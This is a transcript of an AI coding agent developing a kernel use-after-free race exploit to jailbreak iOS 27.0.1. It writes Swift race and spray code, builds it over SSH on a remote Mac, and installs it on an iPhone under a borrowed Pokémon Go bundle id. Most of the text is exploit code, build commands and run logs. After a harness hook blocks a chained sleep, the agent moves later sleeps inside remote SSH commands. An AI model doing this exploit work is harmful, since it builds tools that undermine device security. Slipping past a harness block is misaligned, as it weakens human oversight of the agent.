@@ -1,0 +1,1239 @@
+ ▐▛███▛█   Claude Code v2.1.323
+▝▜██████▀  Hinoki-Offensive-Beta-2 · API Usage Billing
+ ▝▝   ▝▝   G:\iOS 27.0.1\iOS
+
+
+> read the handoff.md file                                                      
+
+● I'll read the handoff file.
+
+  Thought for 3s, searched for 1 pattern, read 1 file, listed 2 directories (ctrl+o to expand)
+
+● Read G:\iOS 27.0.1\iOS\HANDOFF.md (last updated today ~12:15). Summary:
+
+  Goal: jailbreak iOS 27.0/27.0.1. Blocking gate is a kernel R/W primitive; lead
+  vector is CVE-2026-112514, a socket-buffer UAF in uipc_socket2.c (live on
+  27.0.1, fixed in 27.2).
+
+  Where it stands (stage 4, ~55%):
+  - Carrier app runs three close-vs-send race variants (round-robin), via
+    --sockuaf on com.nianticlabs.pokemongo.4L9HF29JJU.
+  - Latest runs: 3000 iters clean with no win; ~6700 iters then SIGKILL. The 
+    race has never been won.
+  - Three open problems: (1) the race itself never fires — loopback drains
+    instantly, window too tight, detection too weak; (2) mysterious SIGKILL
+    around 6700 iters (unknown cause, need JetsamEvent/ApplicationExit reports);
+    (3) no KASLR/pointer-leak oracle, so a win would be invisible anyway.
+
+  Concrete next steps recorded: use a real non-reading network peer or shrink
+  SO_RCVBUF to force backlog; add slow/blocking receiver + CPU contention; watch
+  target socket state / getpeername / odd send() returns and panics; dig into
+  the SIGKILL.
+
+  Constraints worth noting:
+  - Signing profile expires 2026-11-15 — two days out, regenerate first.
+  - iPhone 13 Pro is off usbmux and needs a physical force-restart; the 17 Pro
+    (00008150-00095CD93444C01C) is the healthy 27.0.1 target.
+  - Mac is reachable via Tailscale volpidash@100.110.170.78 with
+    ~/.ssh/mac_ios16_ed25519, flaky Wi-Fi — long jobs must run detached with
+    retries.
+  - Don't trust the Tahoe VM; it can't boot.
+
+  Other threads: kernelcache 27.0.1→27.2 diff is done and triaged;
+  AppleJPEGDriver is reachable but no bug yet; bounty folder has no confirmed
+  novel vuln.
+
+  Want me to start on the next steps — e.g. rework the race to force backlog, or
+  pull the crash reports for the SIGKILL first? I'd start with the SIGKILL,
+  since a longer-running carrier is a prerequisite for every race experiment.
+
+✻ Brewed for 20s · done 12:15 PM
+
+> just make the jailbreak work, test it on the iphone 17 pro on the macbook     
+
+  Thought for 5s, read 2 files (ctrl+o to expand)
+
+● Bash(ls -la ~/.ssh/ 2>/dev/null; echo "---"; timeout 20 ssh -o BatchMode=yes
+      -o ConnectTimeout=10 -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'hostname; sw_…)
+  ⎿  total 48
+     drwxr-xr-x 1 Volpi 197609    0 Nov 13 10:58 .
+     drwxr-xr-x 1 Volpi 197609    0 Nov 13 03:19 ..
+     … +33 lines (ctrl+o to expand)
+
+  Thought for 2s (ctrl+o to expand)
+
+● Mac is up and the 17 Pro is online. Let me look at the current carrier code
+  and latest run log.
+
+  Thought for 1m 36s, searched for 1 pattern, read 6 files, listed 2 directories (ctrl+o to expand)
+
+● Bash(timeout 30 ssh -o ConnectTimeout=10 -i ~/.ssh/mac_ios16_ed25519
+      volpidash@100.110.170.78 'cat ~/build_race.sh; echo ---; ls -la
+      ~/agx-probe-project/AGXProbe/ |…)
+  ⎿  #!/bin/bash
+     # Build AGXProbe v99 (race harness) for the iPhone 13 Pro.
+     cd ~/agx-probe-project || exit 1
+     … +20 lines (ctrl+o to expand)
+
+  Read 1 file (ctrl+o to expand)
+
+> but its on V123 no?                                                           
+
+  Thought for 5s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && git log --oneline -15 2>&1; echo
+      "---REMOTE---"; timeout 30 ssh -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170…)
+  ⎿  ec62c43 Add HANDOFF (resume state) + socket-UAF carrier v3 (3 race var
+     iants)
+     86452f0 Add socket-UAF run log + upstream reference PoCs; update progr
+     … +15 lines (ctrl+o to expand)
+
+  Thought for 4s (ctrl+o to expand)
+
+● Bash(timeout 30 ssh -o ConnectTimeout=10 -i ~/.ssh/mac_ios16_ed25519
+      volpidash@100.110.170.78 'shasum -a 256
+      ~/agx-probe-project/AGXProbe/ContentView.swift' 2>&1; sh…)
+  ⎿  1d347b2fb79ad057fd7386eddee5bbe0766801b6553ed1e1ab0231ea6dbc17c8  /Use
+     rs/volpidash/agx-probe-project/AGXProbe/ContentView.swift
+     1d347b2fb79ad057fd7386eddee5bbe0766801b6553ed1e1ab0231ea6dbc17c8 *C:/U
+     sers/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift
+
+  Thought for 1m 30s (ctrl+o to expand)
+
+● Yes — --sockuaf with all three variants is already in v123, and the local copy
+  matches the Mac byte-for-byte (1d347b2f…). So the port isn't the gap. The gap
+  is that the ported race mechanics can't win: it spawns fresh threads per
+  iteration, then has each thread poll with usleep(1) — so the close and the two
+  send()s land milliseconds apart with essentially zero kernel overlap. And
+  ~2.7 new 512 KB-stack threads per iteration is also the likely SIGKILL cause.
+
+  I'll rewrite the race to use persistent spinning workers (created once), long
+  in-kernel sends (8 KB into a 4 KB sndbuf), and a persistent closer.
+
+● Update(C:\Users\Volpi\AppData\Local\hermes\cache\scratch\ContentView.swift)
+  ⎿  Added 63 lines
+      444          var stop = false
+      445      }
+      446  
+      447 +    // Shared race state. Plain Int32 words in heap memory so 
+          +the worker                                                    
+      448 +    // threads do not pay ARC / exclusivity costs while spinni
+          +ng.                                                           
+      449 +    //   [0] fd   [1] phase (0 idle, 1 armed, 2 close-now, 3 c
+          +losed)                                                        
+      450 +    //   [2] stop [3] oddErr [4] postCloseOk [5] lastErrno [6]
+          + sends                                                        
+      451 +    final class SockUafState {                                
+      452 +        let p = UnsafeMutablePointer<Int32>.allocate(capacity:
+          + 8)                                                           
+      453 +        init() { p.initialize(repeating: 0, count: 8) }       
+      454 +        deinit { p.deinitialize(count: 8); p.deallocate() }   
+      455 +        var fd: Int32 { get { p[0] } set { p[0] = newValue } }
+      456 +        var phase: Int32 { get { p[1] } set { p[1] = newValue 
+          +} }                                                           
+      457 +        var stop: Int32 { get { p[2] } set { p[2] = newValue }
+          + }                                                            
+      458 +        var odd: Int32 { get { p[3] } set { p[3] = newValue } 
+          +}                                                             
+      459 +        var postCloseOk: Int32 { get { p[4] } set { p[4] = new
+          +Value } }                                                     
+      460 +        var lastErr: Int32 { get { p[5] } set { p[5] = newValu
+          +e } }                                                         
+      461 +        var sends: Int32 { get { p[6] } set { p[6] = newValue 
+          +} }                                                           
+      462 +        var closeSeen: Int32 { get { p[7] } set { p[7] = newVa
+          +lue } }                                                       
+      463 +    }                                                         
+      464 +                                                              
+      465 +    func sockUafSenderLoop(_ st: SockUafState, _ buf: UnsafeMu
+          +tablePointer<UInt8>, _ len: Int) {                            
+      466 +        var n: Int32 = 0                                      
+      467 +        while st.stop == 0 {                                  
+      468 +            if st.phase == 0 { continue }                     
+      469 +            let fd = st.fd                                    
+      470 +            if fd < 0 { continue }                            
+      471 +            n &+= 1                                           
+      472 +            if (n & 7) == 0 {                                 
+      473 +                _ = shutdown(fd, SHUT_RDWR)                   
+      474 +            } else {                                          
+      475 +                let r = send(fd, buf, len, MSG_DONTWAIT)      
+      476 +                OSAtomicIncrement32Barrier(&st.p[6])          
+      477 +                if r >= 0 {                                   
+      478 +                    // A success after close() has returned me
+          +ans the fd/so was                                             
+      479 +                    // still considered live: the replaced-slo
+          +t (UAF) window.                                               
+      480 +                    if st.phase == 3 { OSAtomicIncrement32Barr
+          +ier(&st.p[4]) }                                               
+      481 +                } else {                                      
+      482 +                    let e = errno                             
+      483 +                    if st.phase == 3 {                        
+      484 +                        if e != EBADF { OSAtomicIncrement32Bar
+          +rier(&st.p[3]); st.lastErr = e }                              
+      485 +                    } else if e != EAGAIN && e != EBADF && e !
+          += EWOULDBLOCK && e != EINTR                                   
+      486 +                                && e != EPIPE && e != ENOTCONN
+          + && e != ECONNRESET                                           
+      487 +                                && e != ENOBUFS && e != EINVAL
+          + {                                                            
+      488 +                        OSAtomicIncrement32Barrier(&st.p[3]); 
+          +st.lastErr = e                                                
+      489 +                    }                                         
+      490 +                }                                             
+      491 +            }                                                 
+      492 +        }                                                     
+      493 +    }                                                         
+      494 +                                                              
+      495 +    func sockUafCloserLoop(_ st: SockUafState) {              
+      496 +        var lastSeen: Int32 = -1                              
+      497 +        while st.stop == 0 {                                  
+      498 +            if st.phase == 2 {                                
+      499 +                let fd = st.fd                                
+      500 +                if fd >= 0 && fd != lastSeen {                
+      501 +                    lastSeen = fd                             
+      502 +                    close(fd)                                 
+      503 +                    st.closeSeen &+= 1                        
+      504 +                    st.phase = 3                              
+      505 +                }                                             
+      506 +            }                                                 
+      507 +        }                                                     
+      508 +    }                                                         
+      509 +                                                              
+      510      func sockUafMakeSocket(_ ip: String, _ port: Int) -> Int32
+            {
+      511          let fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+      512          if fd < 0 { return -1 }
+
+> just go as far as you can to make a jailbreak                                 
+
+  Thought for 29s, searched for 1 pattern, read 1 file (ctrl+o to expand)
+
+● Bash(sed -n '735,746p'
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift")
+  ⎿              if triggered { break }
+                 if it % 100 == 0 { emit("[*] iter \(it)/\(iterations)") }
+             }
+     … +11 lines (ctrl+o to expand)
+
+● Bash(cat > /tmp/newsock.swift <<'SWIFTEOF'
+          // One hammer-race: senders are already spinning, the closer fires at
+      a…)
+  ⎿  Error: Exit code 2
+     /usr/bin/bash: -c: line 174: unexpected EOF while looking for matching `''
+
+  Thought for 11s, listed 1 directory (ctrl+o to expand)
+
+● Write(tools\newsock_snippet.swift)
+  ⎿  Wrote 169 lines to tools\newsock_snippet.swift
+       1     // One hammer-race: senders are already spinning, the closer
+          fires at a
+       2     // random point while they are in-kernel, then we spray and 
+         check.
+       3     func sockUafRaceOnce(_ st: SockUafState, _ target: Int32, _ 
+         sprayCount: Int,
+       4                          _ it: Int, _ tag: String) -> Bool {
+       5         st.postCloseOk = 0
+       6         st.odd = 0
+       7         st.fd = target
+     … +162 lines (ctrl+o to expand)
+
+  Thought for 2s (ctrl+o to expand)
+
+● Update(tools\newsock_snippet.swift)
+  ⎿  Added 2 lines, removed 2 lines
+      155  
+      156              if it % 100 == 0 && it > 0 {
+      157                  let secs = Date().timeIntervalSince(t0)
+      158 -                emit(String(format: "[*] iter %d/%d  %.1f it/s
+          -  sends=%d",                                                  
+      159 -                            it, iterations, Double(it) / max(s
+          -ecs, 0.001), st.sends))                                       
+      158 +                emit(String(format: "[*] iter %d/%d  %.1f it/s
+          +  sends=%d  afterClose(max)=%d",                              
+      159 +                            it, iterations, Double(it) / max(s
+          +ecs, 0.001), st.sends, maxAfterClose))                        
+      160              }
+      161          }
+      162  
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  start marker: func runSocketUafMode() async { | end marker:
+     980 -> 978
+     625:    func runSocketUafMode() async {
+     742:    func runMetalMode() async {
+
+  Thought for 2s (ctrl+o to expand)
+
+● Bash(sed -n '730,745p'
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift")
+  ⎿                              it, iterations, Double(it) / max(secs, 0.0
+     01), st.sends, maxAfterClose))
+                 }
+     … +16 lines (ctrl+o to expand)
+
+  Thought for 34s (ctrl+o to expand)
+
+● Update(C:\Users\Volpi\AppData\Local\hermes\cache\scratch\ContentView.swift)
+  ⎿  Error editing file
+
+  Read 1 file (ctrl+o to expand)
+
+● Update(C:\Users\Volpi\AppData\Local\hermes\cache\scratch\ContentView.swift)
+  ⎿  Added 3 lines, removed 5 lines
+      493      }
+      494  
+      495      func sockUafCloserLoop(_ st: SockUafState) {
+      496 -        var lastSeen: Int32 = -1                              
+      496 +        // Exactly one party wins 2 -> 3 and performs the clos
+          +e, so a target fd                                             
+      497 +        // number reused by the next iteration can never be cl
+          +osed twice.                                                   
+      498          while st.stop == 0 {
+      499              if st.phase == 2 {
+      500                  let fd = st.fd
+      500 -                if fd >= 0 && fd != lastSeen {                
+      501 -                    lastSeen = fd                             
+      501 +                if fd >= 0 && OSAtomicCompareAndSwap32(2, 3, &
+          +st.p[1]) != 0 {                                               
+      502                      close(fd)
+      503 -                    st.closeSeen &+= 1                        
+      504 -                    st.phase = 3                              
+      503                  }
+      504              }
+      505          }
+
+● Update(C:\Users\Volpi\AppData\Local\hermes\cache\scratch\ContentView.swift)
+  ⎿  Added 4 lines, removed 2 lines
+      574          st.postCloseOk = 0
+      575          st.odd = 0
+      576          st.fd = target
+      577 -        let closeBefore = st.closeSeen                        
+      577          st.phase = 1
+      578          // Keep the senders inside send() for a random slice, 
+           then close.
+      579          usleep(UInt32.random(in: 30...600))
+      580          st.phase = 2
+      581          var spins = 0
+      582          while st.phase != 3 && spins < 400_000 { spins &+= 1 }
+      583 +        if st.phase != 3 {                                    
+      584 +            // Closer starved: win the transition ourselves an
+          +d close here.                                                 
+      585 +            if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) != 0 {
+          + close(target) }                                              
+      586 +        }                                                     
+      587          let afterCloseOk = st.postCloseOk   // successes befor
+           e any spray reuse
+      585 -        if st.closeSeen == closeBefore { close(target) }   // 
+          -closer lost, do it here                                       
+      588          usleep(15)
+      589          let spray = sockUafSpray(sprayCount)
+      590          usleep(150)
+
+  Thought for 5s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  started
+
+● Bash(sleep 45; timeout 30 ssh -i ~/.ssh/mac_ios16_ed25519
+      volpidash@100.110.170.78 'cat /tmp/build124.out 2>/dev/null; echo "---";
+      tail -5 /tmp/br99.log 2>/dev/null')
+  ⎿  Error: Blocked: sleep 45 followed by: timeout 30 ssh -i 
+     ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'cat /tmp/build124.out 
+     2>/dev/null; echo "---"; tail -5 /tmp/br99.log 2>/dev/null'. To wait for a 
+     condition, use Monitor with an until-loop (e.g. `until <check>; do sleep 2;
+     done`). To wait for a command you started, use run_in_background: true. Do
+     not chain shorter sleeps to work around this block.
+
+● Bash(timeout 30 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'cat
+      /tmp/build124.out 2>/dev/null; echo "---BR---"; grep -E "error:|BUILD"
+      /tmp/br99.log 2>…)
+  ⎿  BUILD_EXIT=65
+     /Users/volpidash/agx-probe-project/AGXProbe/ContentView.swift:501:31:
+     error: cannot convert value of type 'Bool' to expected argument type '
+     … +20 lines (ctrl+o to expand)
+
+  Thought for 3s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  501:                if fd >= 0 && OSAtomicCompareAndSwap32(2, 3, &st.p
+     [1]) {
+     585:            if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(ta
+     … +6 lines (ctrl+o to expand)
+
+  Thought for 5s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  started
+
+● Bash(timeout 30 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'cat
+      /tmp/build124.out 2>/dev/null; echo "---"; grep -E "error:|BUILD"
+      /tmp/br99.log 2>/dev/…)
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+     ---
+     ** BUILD SUCCEEDED **
+
+  Thought for 4s (ctrl+o to expand)
+
+● Bash(timeout 120 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  ? installationURL: file:///private/var/containers/Bundle/Application/6
+     9F73BE3-DA3C-4B50-91F8-1E0F46D5056E/AGXProbe.app/
+     ? launchServicesIdentifier: unknown
+     … +3 lines (ctrl+o to expand)
+
+  Thought for 2s (ctrl+o to expand)
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; rm -f /tmp/sock124.log; nohup xcrun
+      devicectl device proces…)
+  ⎿  launched
+
+● Bash(timeout 40 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'head
+      -40 /tmp/sock124.log')
+  ⎿  === CVE-2026-112514 socket UAF trigger (17 Pro, hammer build) ===
+     [?] ITER 0 single: 6 odd errno(s), last=32 (Broken pipe)
+     [?] ITER 1 multi: 4 odd errno(s), last=32 (Broken pipe)
+     … +37 lines (ctrl+o to expand)
+
+  Thought for 8s (ctrl+o to expand)
+
+● Bash(timeout 40 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'grep
+      -E "^\[\*\]|^\[!|^\[\+" /tmp/sock124.log | tail -10; echo ---; wc -l
+      /tmp/sock124.log;…)
+  ⎿  [*] iter 1200/40000  202.9 it/s  sends=6913255  afterClose(max)=2
+     [*] iter 1300/40000  202.3 it/s  sends=7447471  afterClose(max)=2
+     [*] iter 1400/40000  200.7 it/s  sends=8087384  afterClose(max)=2
+     … +13 lines (ctrl+o to expand)
+
+  Thought for 29s (ctrl+o to expand)
+● Race harness is live and fast (200 it/s, 12 M sends) — but it still gets
+  SIGKILLed (~2100 iterations, ~11 s). Before tuning the race, I need to find
+  what's leaking.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  patched
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+
+● Bash(timeout 30 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'grep
+      -E "error:|BUILD" /tmp/br99.log | tail -8')
+  ⎿  ** BUILD SUCCEEDED **
+
+● Bash(timeout 120 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  ? databaseSequenceNumber: 6992
+     ? options:
+     launched
+
+● Bash(timeout 40 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'grep
+      -E "iter " /tmp/sock125.log | tail -20; echo ---; tail -2
+      /tmp/sock125.log')
+  ⎿  [*] iter 100/40000  220.3 it/s  sends=504664  afterClose(max)=1  fds=2
+     0  footprint=9MB
+     [*] iter 200/40000  208.5 it/s  sends=1333850  afterClose(max)=1  fds=
+     … +21 lines (ctrl+o to expand)
+
+  Thought for 10s (ctrl+o to expand)
+
+● Bash(timeout 40 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'ls
+      ~/Library/Logs/CrashReporter/MobileDevice/ 2>/dev/null; echo
+      "---idevice---"; which idev…)
+  ⎿  ---idevice---
+     idevicecrashreport not found
+     idevicesyslog not found
+     … +22 lines (ctrl+o to expand)
+
+  Thought for 8s (ctrl+o to expand)
+
+● Bash(timeout 40 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'xcrun devicectl device copy from --help 2>&1 | head -30; echo ===; xcrun
+      devicectl device i…)
+  ⎿  Error: Exit code 1
+     OVERVIEW: Receive a file from the remote device.
+
+     Copies data from the device, providing domain-specific information (see
+     arguments below for more information).
+
+     USAGE: devicectl device copy from [<options>] --device 
+     <uuid|ecid|serial_number|udid|name|dns_name> --source <source> 
+     --domain-type <domain-type>
+
+     DEVICE OPTIONS:
+       -d, --device <uuid|ecid|serial_number|udid|name|dns_name>
+     … +22 lines (ctrl+o to expand)
+
+  Thought for 5s (ctrl+o to expand)
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device process launch
+      --device $UDID --term…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'sleep 25; UDID=00008150-00095CD93444C01C; xcrun devicectl device info
+      processes --device $U…)
+  ⎿  ---copy---
+     File received from Device
+     /tmp/appdata/reach.log
+     … +7 lines (ctrl+o to expand)
+
+  Thought for 3s (ctrl+o to expand)
+
+● Bash(timeout 90 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'sleep 30; UDID=00008150-00095CD93444C01C; rm -f /tmp/appdata/reach.log;
+      xcrun devicectl dev…)
+  ⎿  Error: Exit code 1
+     [*] iter 3600/40000  185.0 it/s  sends=19080873  afterClose(max)=2  fds=20 
+     footprint=23MB
+     [*] iter 3700/40000  184.7 it/s  sends=19694510  afterClose(max)=2  fds=20 
+     footprint=23MB
+     [*] iter 3800/40000  184.5 it/s  sends=20289576  afterClose(max)=2  fds=20 
+     footprint=24MB
+     0
+
+  Thought for 13s (ctrl+o to expand)
+
+● Bash(timeout 40 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'xcrun devicectl device info files --help 2>&1 | head -25')
+  ⎿  OVERVIEW: List files on the device.
+
+     This command prints a list of the files at a specified path on the dev
+     … +22 lines (ctrl+o to expand)
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device info files
+      --device $UDID --domain-t…)
+  ⎿  Retired/AGXProbe-2026-11-09-152609.ips
+                        Writable, Readable              18 KB       9/11/26
+     , 3:26 PM
+     … +41 lines (ctrl+o to expand)
+
+  Thought for 9s (ctrl+o to expand)
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device info processes
+      --device $UDID 2>&1 |…)
+  ⎿  Error: Exit code 1
+     PID     Executable Path                                                    
+                                                                               
+                                                        
+     -----   -------------------------------------------------------------------
+     ---------------------------------------------------------------------------
+     ----------------------------------------------------
+     1       /sbin/launchd                                                      
+                                                                               
+                                                        
+     33      /usr/libexec/UserEventAgent                                        
+                                                                               
+                                                        
+     35      /usr/libexec/logd                                                  
+                                                                               
+                                                        
+     36      /usr/libexec/runningboardd                                         
+                                                                               
+                                                        
+     39      
+     /System/Library/PrivateFrameworks/AssistantServices.framework/assistantd   
+                                                                               
+                                                
+     40      /usr/libexec/routined                                              
+                                                                               
+                                                        
+     ---grep---
+     … +1 line (ctrl+o to expand)
+
+  Thought for 13s (ctrl+o to expand)
+
+● Bash(timeout 90 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device process launch
+      --device $UDID --term…)
+  ⎿  alive_count:
+     1
+
+  Thought for 9s (ctrl+o to expand)
+
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device info files
+      --device $UDID --domain-t…)
+  ⎿  500 files:
+     Name
+                        URL Resources                   Size        Modific
+     … +39 lines (ctrl+o to expand)
+
+  Thought for 2s (ctrl+o to expand)
+● Bash(timeout 60 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; rm -f /tmp/c1.ips; xcrun devicectl device
+      copy from --devic…)
+  ⎿  /tmp/c1.ips
+     {"app_name":"AGXProbe","timestamp":"2026-11-13 12:33:07.00 +0000","app
+     _version":"1.0","slice_uuid":"c3bccca8-ea50-3151-9c29-7cbdbdd69ff6","b
+     … +259 lines (ctrl+o to expand)
+
+  Thought for 30s (ctrl+o to expand)
+
+● Root cause found — it's not jetsam at all:
+
+  termination: FRONTBOARD 0x8BADF00D ... scene-create watchdog
+  transgression: exhausted real (wall clock) time allowance of 19.96 seconds
+
+  The whole race loop runs on the MainActor from .task, so the scene never
+  finishes creating and SpringBoard kills it at 20 s. I'll move the loop off the
+  main actor.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io, re…)
+  ⎿  ok
+     142:        if args.contains("--sockuaf") { Task.detached { await self
+     .runSocketUafMode() }; return }
+     … +10 lines (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+
+● Bash(timeout 30 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78 'cat
+      /tmp/build124.out; echo ---; grep -E "error:|BUILD" /tmp/br99.log | tail
+      -12')
+  ⎿  ---
+
+  Thought for 2s (ctrl+o to expand)
+
+● Bash(timeout 40 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=65
+     /Users/volpidash/agx-probe-project/AGXProbe/ContentView.swift:122:29:
+     error: Unterminated string literal (in target 'AGXProbe' from project
+     … +5 lines (ctrl+o to expand)
+
+  Thought for 5s, read 1 file (ctrl+o to expand)
+
+● Update(C:\Users\Volpi\AppData\Local\hermes\cache\scratch\ContentView.swift)
+  ⎿  Added 1 line, removed 2 lines
+      119          print(m); fflush(stdout)
+      120          Task { @MainActor [weak self] in
+      121              guard let self else { return }
+      122 -            self.log += m + "                                 
+      123 -"                                                             
+      122 +            self.log += m + "\n"                              
+      123              try? self.log.write(to: self.logFileURL, atomicall
+           y: true, encoding: .utf8)
+      124          }
+      125      }
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+     done
+
+● Bash(timeout 120 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=65
+     /Users/volpidash/agx-probe-project/AGXProbe/ContentView.swift:613:21:
+     error: call to main actor-isolated instance method 'emit' in a synchro
+     … +17 lines (ctrl+o to expand)
+
+  Thought for 7s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  127:    private func emit(_ m: String) {
+     142:        if args.contains("--autorun") { emit("AGXProbe v123 ready
+     (use --webscan)") }
+     … +22 lines (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+
+● Bash(timeout 120 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'until [ -s /tmp/build124.out ]; do sleep 1; done; cat /tmp/build124.out')
+  ⎿  BUILD_EXIT=0
+     ** BUILD SUCCEEDED **
+
+  Thought for 4s (ctrl+o to expand)
+
+● Bash(timeout 120 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'UDID=00008150-00095CD93444C01C; xcrun devicectl device install app
+      --device $UDID ~/agx-pr…)
+  ⎿  Launched application with com.nianticlabs.pokemongo.4L9HF29JJU bundle
+     identifier.
+     1
+
+  Thought for 1s (ctrl+o to expand)
+
+● Bash(timeout 120 ssh -i ~/.ssh/mac_ios16_ed25519 volpidash@100.110.170.78
+      'sleep 60; UDID=00008150-00095CD93444C01C; rm -f /tmp/appdata/reach.log;
+      xcrun devicectl de…)
+  ⎿  [*] iter 17200/40000  139.5 it/s  sends=140273589  afterClose(max)=5
+     fds=20  footprint=213MB
+     [*] iter 17400/40000  139.6 it/s  sends=141721742  afterClose(max)=5
+     … +11 lines (ctrl+o to expand)
+
+  Thought for 1m 31s (ctrl+o to expand)
+
+● Now the run survives (17.8k iterations, 145 M sends). Next: a decisive oracle
+  and wider race windows. Three changes — sendmsg with 8 iovecs (longer pre-lock
+  path), a "send succeeded while the fd is still closed" probe, and a pool of
+  long-lived sockets so TCP timers are actually armed when we close them.
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  <stdin>:71: SyntaxWarning: "\(" is an invalid escape sequence. Such se
+     quences will not work in the future. Did you mean "\\("? A raw string
+     is also an option.
+     … +9 lines (ctrl+o to expand)
+
+  Thought for 33s (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && python -I - <<'PY'
+      import io…)
+  ⎿  <stdin>:28: SyntaxWarning: "\(" is an invalid escape sequence. Such se
+     quences will not work in the future. Did you mean "\\("? A raw string
+     is also an option.
+     … +6 lines (ctrl+o to expand)
+  Thought for 5s, read 1 file (ctrl+o to expand)
+
+● Bash(cd "/g/iOS 27.0.1/iOS" && timeout 60 scp -o ConnectTimeout=10 -i
+      ~/.ssh/mac_ios16_ed25519
+      "C:/Users/Volpi/AppData/Local/hermes/cache/scratch/ContentView.swift"…)
+  ⎿  ok
+
